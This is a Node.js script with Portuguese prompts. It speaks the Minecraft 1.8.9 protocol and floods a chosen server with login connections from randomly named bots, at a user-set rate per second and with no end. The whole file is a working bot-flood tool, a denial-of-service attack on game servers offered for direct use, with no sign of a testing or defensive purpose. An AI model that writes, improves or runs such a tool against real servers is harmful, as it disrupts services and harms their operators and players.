const net = require('net');
const readline = require('readline');
const chalk = require('chalk');

let verboseMode = false;

function log(message, force = false) {
  if (verboseMode || force) {
    console.log(message);
  }
}

const ConnectionState = {
  HANDSHAKING: 0,
  LOGIN: 2,
  PLAY: 3,
  STATUS: 1
};

function loginStartPacket(username) {
  const nameLength = createVarInt(username.length);
  const usernameBuffer = Buffer.from(username, 'utf-8');
  return createPacket(0x00, Buffer.concat([nameLength, usernameBuffer]));
}

function readVarInt(buffer, offset = 0) {
  let numRead = 0;
  let result = 0;
  let read;
  do {
    read = buffer.readUInt8(offset + numRead);
    result |= (read & 0x7F) << (7 * numRead);
    numRead++;
    if (numRead > 5) {
      throw new Error('VarInt is too big');
    }
  } while ((read & 0x80) !== 0);
  return { value: result, size: numRead };
}

function createVarInt(value) {
  const buffer = [];
  while (true) {
    if ((value & ~0x7F) === 0) {
      buffer.push(value);
      return Buffer.from(buffer);
    }
    buffer.push((value & 0x7F) | 0x80);
    value >>>= 7;
  }
}

function cleanMinecraftFormatting(text) {
  return text.replace(/§[0-9a-fk-or]/g, '');
}

function readString(buffer, offset = 0) {
  const { value: length, size: lengthSize } = readVarInt(buffer, offset);
  const string = buffer.slice(offset + lengthSize, offset + lengthSize + length).toString('utf8');
  return { value: string, size: lengthSize + length };
}

function createPacket(packetId, data) {
  const packetLength = createVarInt(data.length + 1);
  const idBuffer = Buffer.from([packetId]);
  return Buffer.concat([packetLength, idBuffer, data]);
}

function handshakePacket(serverIP, serverPort, nextState) {
  const protocolVersion = createVarInt(47); // Versão do protocolo 1.8.9
  const serverAddress = Buffer.concat([Buffer.from([serverIP.length]), Buffer.from(serverIP)]);
  const portBuffer = Buffer.alloc(2);
  portBuffer.writeUInt16BE(serverPort);
  const nextStateBuffer = createVarInt(nextState);
  return createPacket(0x00, Buffer.concat([protocolVersion, serverAddress, portBuffer, nextStateBuffer]));
}

function statusRequestPacket() {
  return createPacket(0x00, Buffer.alloc(0));
}

function pingPacket() {
  const payload = Buffer.alloc(8);
  return createPacket(0x01, payload);
}

function pingServer(serverIP, serverPort, callback) {
  const client = new net.Socket();
  
  client.connect(serverPort, serverIP, () => {
    log('Conectado para pingar o servidor...', false);

    // Fase de handshaking para o status
    client.write(handshakePacket(serverIP, serverPort, ConnectionState.STATUS));

    // Enviando o status request
    client.write(statusRequestPacket());
  });

  client.on('data', (data) => {
    let offset = 0;
    const { value: packetLength, size: lengthSize } = readVarInt(data, offset);
    offset += lengthSize;
    const { value: packetId, size: idSize } = readVarInt(data, offset);
    offset += idSize;

    if (packetId === 0x00) {
      const { value: motdJson } = readString(data, offset);
      
      const cleanedMotdJson = motdJson.replace(/§[0-9a-fk-or]/g, '').replace(/\n/g, '\\n');
      
      try {
        const motd = JSON.parse(cleanedMotdJson);
        log(`MOTD do servidor: ${motd.description.text || motd.description}`, true);
      } catch (e) {
        log(chalk.yellow('JSON error:'), chalk.yellow(e.message), false);
        log(chalk.green('Ignoring...'), false);
        log(`MOTD JSON recebido ${cleanedMotdJson}:`, false);
      }

      client.write(pingPacket());
    }

    if (packetId === 0x01) {
      log('Servidor pingado com sucesso.', false);
      client.end();
      callback();
    }
  });

  client.on('error', (err) => {
    console.error('Erro durante o ping:', err);
    client.end();
  });

  client.on('close', () => {
    log('Conexão para o ping fechada.', false);
  });
}

function connectBot(serverIP, serverPort, username) {
  pingServer(serverIP, serverPort, () => {
    const client = new net.Socket();
    let connectionState = ConnectionState.HANDSHAKING;

    client.connect(serverPort, serverIP, () => {
      log(`Bot ${username} connected!`, true);
      client.write(handshakePacket(serverIP, serverPort, ConnectionState.LOGIN));
      client.write(loginStartPacket(username));
      connectionState = ConnectionState.LOGIN;
    });

    client.on('data', (data) => {
		
    });

    client.on('error', (err) => {
      console.error(`Error for bot ${username}:`, err);
    });

    client.on('close', () => {
      log(`Connection closed for bot ${username}`, true);
    });
  });
}

function generateRandomBotName() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * 3) + 5; // Gera um nome com 5 a 7 caracteres
  let botName = '';
  for (let i = 0; i < length; i++) {
    botName += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return botName;
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Modo verbose? (s/n): ', (answer) => {
  verboseMode = answer.toLowerCase() === 's';
  
  rl.question('Modo debug? (s/n): ', (debugMode) => {
    if (debugMode.toLowerCase() === 's') {
      log('Entrando em modo debug...', true);
      connectBot('127.0.0.1', 25565, 'BotDebug');
    } else {
      rl.question('Digite o IP do servidor: ', (serverIP) => {
        rl.question('Digite a porta do servidor: ', (serverPort) => {
          rl.question('Digite o número de bots para conectar por segundo: ', (botsPerSecond) => {
            rl.close();

            log('Pingando o servidor antes de conectar os bots...', true);

            pingServer(serverIP, parseInt(serverPort), () => {});
              const connectRate = parseInt(botsPerSecond);
              let botCount = 0;

              log(`Conectando ${connectRate} bots por segundo a ${serverIP}:${serverPort} indefinidamente.`, true);

              setInterval(() => {
                for (let i = 0; i < connectRate; i++) {
                  botCount++;
                  const botName = generateRandomBotName();
                  connectBot(serverIP, parseInt(serverPort), botName);
                }
                log(`Total de bots conectados: ${botCount}`, true);
              }, 1000);
          });
        });
      });
    }
  });
});
